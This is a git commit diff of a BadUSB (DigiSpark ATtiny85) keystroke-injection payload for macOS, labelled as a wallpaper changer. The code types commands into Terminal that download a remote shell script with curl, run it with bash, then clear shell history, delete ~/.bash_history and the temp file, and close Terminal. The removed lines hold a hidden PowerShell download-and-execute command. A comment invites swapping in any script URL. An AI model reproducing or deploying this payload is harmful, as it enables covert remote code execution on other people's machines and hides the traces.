030f9e52452bd959d4b9026fdfafba8d413e1cd6
msr8 <live.shashwat@gmail.com>
2022-10-07 17:42:12 +0530

    i am dumb

--- Payloads/Wallpaper Changer/wallpaper_mac.ino
+++ Payloads/Wallpaper Changer/wallpaper_mac.ino
@@ -9,20 +9,37 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(600);
 
-  // Opens the run dialog
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  // Hits cmd+space to open spotlight
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
 
-  // Writes the command
-  DigiKeyboard.print("powershell -w h ");
-  DigiKeyboard.print("iex (irm \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/bash/wallpaper.sh");  // LINK HERE
-  DigiKeyboard.print("\")");
-  // Enters it
+  // Opens terminal
+  DigiKeyboard.print("Terminal.app");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+
+  // https://superuser.com/a/448465
+  DigiKeyboard.print(" \"$( ");
+  // Downloads the script
+  DigiKeyboard.print("curl \"");
+  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/bash/wallpaper.sh");  // CHANGE THE URL HERE TO YOUR SCRIPT
+  DigiKeyboard.print("\" > $TMPDIR/16691615; " );
+  // Runs it
+  DigiKeyboard.print("bash $TMPDIR/16691615; ");
+  // Cleans up after itself
+  DigiKeyboard.print("history -c; ");
+  DigiKeyboard.print("rm ~/.bash_history;" );
+  DigiKeyboard.print("rm $TMPDIR/16691615");
+  // Hits enter
+  DigiKeyboard.print(" )\" & disown;");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // Quits terminal
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 
 
   for (;;) {/* Stops the loop */}
 }
-
